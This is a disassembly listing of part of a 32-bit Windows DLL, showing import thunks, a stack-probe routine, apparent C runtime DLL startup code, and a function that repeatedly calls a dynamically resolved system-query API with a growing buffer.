1000d30b:	90                   	nop
1000d30c:	90                   	nop
1000d30d:	90                   	nop
1000d30e:	90                   	nop
1000d30f:	90                   	nop
1000d310:	ff 25 a8 e1 00 10    	jmp    *0x1000e1a8
1000d316:	ff 25 ac e1 00 10    	jmp    *0x1000e1ac
1000d31c:	ff 25 b8 e1 00 10    	jmp    *0x1000e1b8
1000d322:	cc                   	int3
1000d323:	cc                   	int3
1000d324:	cc                   	int3
1000d325:	cc                   	int3
1000d326:	cc                   	int3
1000d327:	cc                   	int3
1000d328:	cc                   	int3
1000d329:	cc                   	int3
1000d32a:	cc                   	int3
1000d32b:	cc                   	int3
1000d32c:	cc                   	int3
1000d32d:	cc                   	int3
1000d32e:	cc                   	int3
1000d32f:	cc                   	int3
1000d330:	51                   	push   %ecx
1000d331:	3d 00 10 00 00       	cmp    $0x1000,%eax
1000d336:	8d 4c 24 08          	lea    0x8(%esp),%ecx
1000d33a:	72 14                	jb     0x1000d350
1000d33c:	81 e9 00 10 00 00    	sub    $0x1000,%ecx
1000d342:	2d 00 10 00 00       	sub    $0x1000,%eax
1000d347:	85 01                	test   %eax,(%ecx)
1000d349:	3d 00 10 00 00       	cmp    $0x1000,%eax
1000d34e:	73 ec                	jae    0x1000d33c
1000d350:	2b c8                	sub    %eax,%ecx
1000d352:	8b c4                	mov    %esp,%eax
1000d354:	85 01                	test   %eax,(%ecx)
1000d356:	8b e1                	mov    %ecx,%esp
1000d358:	8b 08                	mov    (%eax),%ecx
1000d35a:	8b 40 04             	mov    0x4(%eax),%eax
1000d35d:	50                   	push   %eax
1000d35e:	c3                   	ret
1000d35f:	cc                   	int3
1000d360:	ff 25 bc e1 00 10    	jmp    *0x1000e1bc
1000d366:	ff 25 c4 e1 00 10    	jmp    *0x1000e1c4
1000d36c:	cc                   	int3
1000d36d:	cc                   	int3
1000d36e:	cc                   	int3
1000d36f:	cc                   	int3
1000d370:	8b 44 24 08          	mov    0x8(%esp),%eax
1000d374:	85 c0                	test   %eax,%eax
1000d376:	75 0e                	jne    0x1000d386
1000d378:	39 05 54 08 01 10    	cmp    %eax,0x10010854
1000d37e:	7e 2e                	jle    0x1000d3ae
1000d380:	ff 0d 54 08 01 10    	decl   0x10010854
1000d386:	8b 0d 98 e1 00 10    	mov    0x1000e198,%ecx
1000d38c:	83 f8 01             	cmp    $0x1,%eax
1000d38f:	8b 09                	mov    (%ecx),%ecx
1000d391:	89 0d 5c 08 01 10    	mov    %ecx,0x1001085c
1000d397:	75 3f                	jne    0x1000d3d8
1000d399:	68 80 00 00 00       	push   $0x80
1000d39e:	ff 15 c0 e1 00 10    	call   *0x1000e1c0
1000d3a4:	85 c0                	test   %eax,%eax
1000d3a6:	59                   	pop    %ecx
1000d3a7:	a3 64 08 01 10       	mov    %eax,0x10010864
1000d3ac:	75 04                	jne    0x1000d3b2
1000d3ae:	33 c0                	xor    %eax,%eax
1000d3b0:	eb 66                	jmp    0x1000d418
1000d3b2:	83 20 00             	andl   $0x0,(%eax)
1000d3b5:	a1 64 08 01 10       	mov    0x10010864,%eax
1000d3ba:	68 04 00 01 10       	push   $0x10010004
1000d3bf:	68 00 00 01 10       	push   $0x10010000
1000d3c4:	a3 60 08 01 10       	mov    %eax,0x10010860
1000d3c9:	e8 14 01 00 00       	call   0x1000d4e2
1000d3ce:	ff 05 54 08 01 10    	incl   0x10010854
1000d3d4:	59                   	pop    %ecx
1000d3d5:	59                   	pop    %ecx
1000d3d6:	eb 3d                	jmp    0x1000d415
1000d3d8:	85 c0                	test   %eax,%eax
1000d3da:	75 39                	jne    0x1000d415
1000d3dc:	a1 64 08 01 10       	mov    0x10010864,%eax
1000d3e1:	85 c0                	test   %eax,%eax
1000d3e3:	74 30                	je     0x1000d415
1000d3e5:	8b 0d 60 08 01 10    	mov    0x10010860,%ecx
1000d3eb:	56                   	push   %esi
1000d3ec:	8d 71 fc             	lea    -0x4(%ecx),%esi
1000d3ef:	3b f0                	cmp    %eax,%esi
1000d3f1:	72 12                	jb     0x1000d405
1000d3f3:	8b 0e                	mov    (%esi),%ecx
1000d3f5:	85 c9                	test   %ecx,%ecx
1000d3f7:	74 07                	je     0x1000d400
1000d3f9:	ff d1                	call   *%ecx
1000d3fb:	a1 64 08 01 10       	mov    0x10010864,%eax
1000d400:	83 ee 04             	sub    $0x4,%esi
1000d403:	eb ea                	jmp    0x1000d3ef
1000d405:	50                   	push   %eax
1000d406:	ff 15 c8 e1 00 10    	call   *0x1000e1c8
1000d40c:	83 25 64 08 01 10 00 	andl   $0x0,0x10010864
1000d413:	59                   	pop    %ecx
1000d414:	5e                   	pop    %esi
1000d415:	6a 01                	push   $0x1
1000d417:	58                   	pop    %eax
1000d418:	c2 0c 00             	ret    $0xc
1000d41b:	55                   	push   %ebp
1000d41c:	8b ec                	mov    %esp,%ebp
1000d41e:	53                   	push   %ebx
1000d41f:	8b 5d 08             	mov    0x8(%ebp),%ebx
1000d422:	56                   	push   %esi
1000d423:	8b 75 0c             	mov    0xc(%ebp),%esi
1000d426:	57                   	push   %edi
1000d427:	8b 7d 10             	mov    0x10(%ebp),%edi
1000d42a:	85 f6                	test   %esi,%esi
1000d42c:	75 09                	jne    0x1000d437
1000d42e:	83 3d 54 08 01 10 00 	cmpl   $0x0,0x10010854
1000d435:	eb 26                	jmp    0x1000d45d
1000d437:	83 fe 01             	cmp    $0x1,%esi
1000d43a:	74 05                	je     0x1000d441
1000d43c:	83 fe 02             	cmp    $0x2,%esi
1000d43f:	75 22                	jne    0x1000d463
1000d441:	a1 68 08 01 10       	mov    0x10010868,%eax
1000d446:	85 c0                	test   %eax,%eax
1000d448:	74 09                	je     0x1000d453
1000d44a:	57                   	push   %edi
1000d44b:	56                   	push   %esi
1000d44c:	53                   	push   %ebx
1000d44d:	ff d0                	call   *%eax
1000d44f:	85 c0                	test   %eax,%eax
1000d451:	74 0c                	je     0x1000d45f
1000d453:	57                   	push   %edi
1000d454:	56                   	push   %esi
1000d455:	53                   	push   %ebx
1000d456:	e8 15 ff ff ff       	call   0x1000d370
1000d45b:	85 c0                	test   %eax,%eax
1000d45d:	75 04                	jne    0x1000d463
1000d45f:	33 c0                	xor    %eax,%eax
1000d461:	eb 4e                	jmp    0x1000d4b1
1000d463:	57                   	push   %edi
1000d464:	56                   	push   %esi
1000d465:	53                   	push   %ebx
1000d466:	e8 9e 4c ff ff       	call   0x10002109
1000d46b:	83 fe 01             	cmp    $0x1,%esi
1000d46e:	89 45 0c             	mov    %eax,0xc(%ebp)
1000d471:	75 0c                	jne    0x1000d47f
1000d473:	85 c0                	test   %eax,%eax
1000d475:	75 37                	jne    0x1000d4ae
1000d477:	57                   	push   %edi
1000d478:	50                   	push   %eax
1000d479:	53                   	push   %ebx
1000d47a:	e8 f1 fe ff ff       	call   0x1000d370
1000d47f:	85 f6                	test   %esi,%esi
1000d481:	74 05                	je     0x1000d488
1000d483:	83 fe 03             	cmp    $0x3,%esi
1000d486:	75 26                	jne    0x1000d4ae
1000d488:	57                   	push   %edi
1000d489:	56                   	push   %esi
1000d48a:	53                   	push   %ebx
1000d48b:	e8 e0 fe ff ff       	call   0x1000d370
1000d490:	85 c0                	test   %eax,%eax
1000d492:	75 03                	jne    0x1000d497
1000d494:	21 45 0c             	and    %eax,0xc(%ebp)
1000d497:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
1000d49b:	74 11                	je     0x1000d4ae
1000d49d:	a1 68 08 01 10       	mov    0x10010868,%eax
1000d4a2:	85 c0                	test   %eax,%eax
1000d4a4:	74 08                	je     0x1000d4ae
1000d4a6:	57                   	push   %edi
1000d4a7:	56                   	push   %esi
1000d4a8:	53                   	push   %ebx
1000d4a9:	ff d0                	call   *%eax
1000d4ab:	89 45 0c             	mov    %eax,0xc(%ebp)
1000d4ae:	8b 45 0c             	mov    0xc(%ebp),%eax
1000d4b1:	5f                   	pop    %edi
1000d4b2:	5e                   	pop    %esi
1000d4b3:	5b                   	pop    %ebx
1000d4b4:	5d                   	pop    %ebp
1000d4b5:	c2 0c 00             	ret    $0xc
1000d4b8:	ff 25 d0 e1 00 10    	jmp    *0x1000e1d0
1000d4be:	ff 25 d8 e1 00 10    	jmp    *0x1000e1d8
1000d4c4:	ff 25 e0 e1 00 10    	jmp    *0x1000e1e0
1000d4ca:	ff 25 ec e1 00 10    	jmp    *0x1000e1ec
1000d4d0:	ff 25 f0 e1 00 10    	jmp    *0x1000e1f0
1000d4d6:	ff 25 80 e1 00 10    	jmp    *0x1000e180
1000d4dc:	ff 25 84 e1 00 10    	jmp    *0x1000e184
1000d4e2:	ff 25 f4 e1 00 10    	jmp    *0x1000e1f4
1000d4e8:	cc                   	int3
1000d4e9:	cc                   	int3
1000d4ea:	cc                   	int3
1000d4eb:	cc                   	int3
1000d4ec:	cc                   	int3
1000d4ed:	cc                   	int3
1000d4ee:	cc                   	int3
1000d4ef:	cc                   	int3
1000d4f0:	55                   	push   %ebp
1000d4f1:	8b ec                	mov    %esp,%ebp
1000d4f3:	51                   	push   %ecx
1000d4f4:	53                   	push   %ebx
1000d4f5:	8b 5d 0c             	mov    0xc(%ebp),%ebx
1000d4f8:	56                   	push   %esi
1000d4f9:	57                   	push   %edi
1000d4fa:	33 ff                	xor    %edi,%edi
1000d4fc:	3b df                	cmp    %edi,%ebx
1000d4fe:	0f 84 8e 00 00 00    	je     0x1000d592
1000d504:	8b 75 10             	mov    0x10(%ebp),%esi
1000d507:	3b f7                	cmp    %edi,%esi
1000d509:	0f 84 83 00 00 00    	je     0x1000d592
1000d50f:	39 3d 58 08 01 10    	cmp    %edi,0x10010858
1000d515:	75 20                	jne    0x1000d537
1000d517:	68 40 03 01 10       	push   $0x10010340
1000d51c:	ff 15 f4 e0 00 10    	call   *0x1000e0f4
1000d522:	68 30 07 01 10       	push   $0x10010730
1000d527:	50                   	push   %eax
1000d528:	ff 15 1c e1 00 10    	call   *0x1000e11c
1000d52e:	3b c7                	cmp    %edi,%eax
1000d530:	a3 58 08 01 10       	mov    %eax,0x10010858
1000d535:	74 5b                	je     0x1000d592
1000d537:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000d53b:	89 3b                	mov    %edi,(%ebx)
1000d53d:	8b 5d 14             	mov    0x14(%ebp),%ebx
1000d540:	89 3e                	mov    %edi,(%esi)
1000d542:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
1000d546:	75 0e                	jne    0x1000d556
1000d548:	81 c3 00 14 00 00    	add    $0x1400,%ebx
1000d54e:	81 fb 00 e8 03 00    	cmp    $0x3e800,%ebx
1000d554:	77 30                	ja     0x1000d586
1000d556:	53                   	push   %ebx
1000d557:	57                   	push   %edi
1000d558:	ff 15 dc e1 00 10    	call   *0x1000e1dc
1000d55e:	8b f0                	mov    %eax,%esi
1000d560:	59                   	pop    %ecx
1000d561:	85 f6                	test   %esi,%esi
1000d563:	59                   	pop    %ecx
1000d564:	74 20                	je     0x1000d586
1000d566:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000d569:	8b fe                	mov    %esi,%edi
1000d56b:	50                   	push   %eax
1000d56c:	53                   	push   %ebx
1000d56d:	56                   	push   %esi
1000d56e:	ff 75 08             	push   0x8(%ebp)
1000d571:	ff 15 58 08 01 10    	call   *0x10010858
1000d577:	3d 04 00 00 c0       	cmp    $0xc0000004,%eax
1000d57c:	75 1b                	jne    0x1000d599
1000d57e:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
1000d582:	75 19                	jne    0x1000d59d
1000d584:	eb bc                	jmp    0x1000d542
1000d586:	85 ff                	test   %edi,%edi
1000d588:	74 08                	je     0x1000d592
1000d58a:	57                   	push   %edi
1000d58b:	ff 15 c8 e1 00 10    	call   *0x1000e1c8
1000d591:	59                   	pop    %ecx
1000d592:	32 c0                	xor    %al,%al
1000d594:	5f                   	pop    %edi
1000d595:	5e                   	pop    %esi
1000d596:	5b                   	pop    %ebx
1000d597:	c9                   	leave
1000d598:	c3                   	ret
1000d599:	85 c0                	test   %eax,%eax
1000d59b:	74 07                	je     0x1000d5a4
1000d59d:	85 f6                	test   %esi,%esi
1000d59f:	74 f1                	je     0x1000d592
1000d5a1:	56                   	push   %esi
1000d5a2:	eb e7                	jmp    0x1000d58b
1000d5a4:	8b 45 0c             	mov    0xc(%ebp),%eax
1000d5a7:	8b 4d 10             	mov    0x10(%ebp),%ecx
1000d5aa:	89 30                	mov    %esi,(%eax)
1000d5ac:	8b 45 fc             	mov    -0x4(%ebp),%eax
1000d5af:	89 01                	mov    %eax,(%ecx)
1000d5b1:	b0 01                	mov    $0x1,%al
1000d5b3:	eb df                	jmp    0x1000d594
